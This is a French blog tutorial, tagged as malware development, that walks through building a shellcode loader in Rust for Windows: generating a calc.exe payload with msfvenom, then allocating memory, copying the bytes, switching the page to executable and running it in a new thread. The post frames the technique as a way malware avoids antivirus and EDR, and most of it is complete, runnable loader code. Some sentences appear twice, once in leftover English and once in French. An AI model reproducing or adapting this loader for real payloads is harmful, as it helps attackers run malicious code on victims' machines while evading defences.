---
title: Exécution de Shellcode
date: '2025-04-24'
description: 'Comment faire une exécution de shellcode en Rust'
tags:
  - rust
  - maldev
published: true
---

## Qu'est-ce que l'exécution de shellcode ? 

L'exécution de shellcode est une technique utilisé par les logiciels maveillants pour éviter la détection par les Anti-virus et EDR. Même si cette technique est connue et facilement détecté, c'est important de comprendre comment ça marche car c'est la base de toute méthode d'exécution shellcode.

On va lire un bout de shellcode depuis un fichier, un serveur distant ou depuis un tableau d'octet puis l'exécuter dans le programme local. Notre shellcode est un petit bout de code (souvent écrit en assembly ou compilé en octets) qui n'a pas besoin d'être sur le disque ou chargé par l'OS.

## Comment ça marche ?

L'exécution de shellcode marche en allouant de la mémoire dans le programme actuel et y écrire le shellcode :

![Schema1](/imgs/blog/shellcode_schema1.webp)

puis ensuite, on l'exécute :

![Schema2](/imgs/blog/shellcode_schema2.webp)

## Pré-requis

Premièrement, créons a nouveau projet cargo: 

```sh
cargo new shellcode
cd shellcode
```

On ajoute ça au **Cargo.toml** :

```toml
[dependencies]
windows = { version = "0.61.0", features = [
    "Win32_Security",
    "Win32_System_Threading",
    "Win32_System_Memory"
] }
```

Ok, maintenant on peut générer notre shellcode en utilisant la commande [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) :

```sh
msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f raw -o payload.bin
```

Ce shellcode est **FORTEMENT** signé et sera détecté par n'importe quel antivirus mais il marchera pour notre exemple. 

Ensuite on a besoin d'importer notre ficnier dans notre programme rust. On peut le faire rapidement avec cette macro :

```rust
fn main() {
    let shellcode = include_bytes!("../payload.bin")
}
```

Notre shellcode peut maintenant être écrit directement en mémoire.

## Écrire le shellcode en mémoire

On doit d'abord ajouter quelques imports :

```rust
use std::ptr;
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, VirtualAlloc,
};
```

Maintenant on peut écrire notre fonction pour écrire le shellcode :

```rust
unsafe fn write_shellcode(shellcode: &[u8]) -> *mut std::ffi::c_void {
    println!("[+] Taille du shellcode : {}", shellcode.len());

    unsafe {
		// On réserve l'espace mémoire
        let mem = VirtualAlloc(
            Some(ptr::null_mut()),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

		// On vérifie que l'allocation s'est bien passée
        if mem.is_null() {
            panic!("[-] Échec en allouant la mémoire!");
        }
        println!("[+] Mémoire allouée à l'adresse {:?}", mem);

        // On copie le shellcode dans l'espace mémoire qu'on a réservé
        ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());
        mem
    }
}
```

Ok on va décomposer tout ça !

Premièremente on définit notre fonction

```rust
unsafe fn write_shellcode(shellcode: &[u8]) -> *mut std::ffi::c_void
```

On ajoute `unsafe` car ça appelle les fonctions externes de WinApi. On prends en entrée une référence au tableau d'octet qui contient notre shellcode et on retourne un pointeur vers notre mémoire allouée.

Ensuite on alloue notre espace mémoire en utilisant [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) qui est défini par 

```cpp
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

- **lpAddress** est l'adresse mémoire où l'allocation commence. On s'en fou d'avoir une adresse de départ spécifique donc on passe un pointeur null.
- **dwSize** est la taille de l'allocation qu'on veut faire, ici c'est notre longueur de shellcode.
- **flAllocationType** est le type d'allocation mémoire que l'on veut faire, ici on veut réserver l'espace et y écrire quelque chose.
- **flProtect** est la protection mémoire que l'on veut utiliser, ici on met `READWRITE` et on le changera plus tard en `EXECUTE`.

Enfin on copie notre shellcode dans la mémoire qu'on vient d'allouer

```rust
ptr::copy_nonoverlapping(shellcode.as_ptr(), mem as *mut u8, shellcode.len());
```

Rien de fou ici, on passe juste ce qu'on veut copier, où on veut le copier ainsi que sa taille.

We are now ready to execute our shellcode 😎.
On est maintenant prêt à exécuter notre shellcode 😎.

## Éxécuter notre shellcode

Comme avant, on doit ajouter des imports :

```rust
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE, VirtualAlloc,
};
use windows::Win32::System::Threading::{
    CreateThread, INFINITE, THREAD_CREATION_FLAGS, WaitForSingleObject,
};
```

Maintenant on peut écrire notre fonction :

```rust
unsafe fn execute_shellcode(mem: *mut std::ffi::c_void, length: usize) {
    unsafe {
        // On verifie la protection mémoire
        let mut verify_protect = PAGE_READWRITE;
       
        if VirtualProtect(
            mem,
            length,
            PAGE_EXECUTE,
            &mut verify_protect,
        ).is_err() {
            panic!("[-] Échec pendant la vérification de la protection mémoire !");
        }
        println!("[+] Protection mémoire vérifiée");

        // On converti notre pointeur mémoire en pointeur de fonction et on lance cette dernière
        let shell_fn: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 = std::mem::transmute(mem);
       
        println!("[+] Éxécution du shellcode");       
        let thread = match CreateThread(
            Some(ptr::null_mut()),
            0,
            Some(shell_fn),
            Some(ptr::null_mut()),
            THREAD_CREATION_FLAGS(0),
            Some(ptr::null_mut()),
        ) {
            Ok(thread) => thread,
            Err(_) => panic!("[-] Échec dans l'éxécution du shellcode!"),
        };
        println!("[+] Thread créé");
       
        WaitForSingleObject(thread, INFINITE);

        // On ferme le thread handle pour libérer les ressources
        match CloseHandle(thread) {
            Ok(_) => println!("[+] Le Thread handle a bien été fermé."),
            Err(_) => {
                println!("[-] Échec dans la fermeture du handle de Thread");
            }
        }
        println!("[+] Le shellcode a bien été éxécuté.");
    }
}
```

Encore une fois on va décomposer ça !

Premièrement on définit notre fonction :

```rust
unsafe fn execute_shellcode(mem: *mut std::ffi::c_void, length: usize)
```

Encore une fois on la met unsafe car on va appeler les fonctions de WinApi. On lui passe la mémoire allouée ainsi que la taille du shellcode.

On change la protection mémoire en `EXECUTE` pour pouvoir éxécuter notre shellcode.

We then call the function [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) defined as :
Pour faire ça on appelle la fonction [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) définit par :
```cpp
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```

- **lpAddress** est le début de la section mémoire que l'on veut changer, ici c'est le pointeur de notre shellcode.
- **dwSize** est la taille de la section de mémoire que l'on veut modifier, ici c'est la taille du shellcode.
- **flNewProtect** est le nouveau type de protection de mémoire que l'on veut appliquer
- **lpflOldProtect** est l'ancienne protection mémoire qui est utilisée comme vérification.

Ensuite on dit à Rust de transmuter notre mémoire en pointer de fonction

```rust
let shell_fn: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 = std::mem::transmute(mem);
```

Ici transmuter signifie qu'on change l'interprétation que le language a de la mémoire allouée.

Then, we create a new thread to execute our shellcode using [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread).
Après ça on crée un nouveau thread pour éxécuter notre shellcode avec la fonction [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread).

```rust
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  [in]            SIZE_T                  dwStackSize,
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,
  [in]            DWORD                   dwCreationFlags,
  [out, optional] LPDWORD                 lpThreadId
);
```

- **lpThreadAttributes** est un pointer vers une structure qui détermine si le handle qui sera retounrée peut être hérité par un processus enfant. On en a pas besoin donc on passe ça en tant que pointeur null.
- **dwStackSize** est la taille initiale du stack en octet. On a pas besoin d'une taille spécifique donc on mets 0 pour avoir la taille par défaut.
- **lpStartAddress** est un pointeur vers le début de notre fonction.
- **lpParameter** est un pointer vers les paramètres qui doivent être passés au thread.
- **dwCreationFlags** est un flag utilisé pour contrôler la création d'un thread, on en a pas besoin ici.
- **lpThreadId** est in pointeur vers une variable qui reçoit l'id du thread, on en a pas besoin donc on lui passer un pointeur null.

Ensuite, on appelle [WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject) et on lui passe notre handle de thread. Cette fonction attends qu'un thread soit fini avant d'éxécuter la prochaine instruction.

Enfin, on appelle [CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle) qui ferme explicitement notre thread.

On a maintenant juste à assembler tout ça dans une fonction main :

```rust
fn main() {
    let shellcode = include_bytes!("../payload.bin");
   
    unsafe {
        let mem_pointer = write_shellcode(shellcode);
        println!("[+] Shellcode alloué à l'adresse {:?}", mem_pointer);
        execute_shellcode(mem_pointer, shellcode.len());
    }
}
```

Comme on peut le voir, notre shellcode est éxécuté !
![shellcode execution](/imgs/blog/shellcode_final_screen.webp)
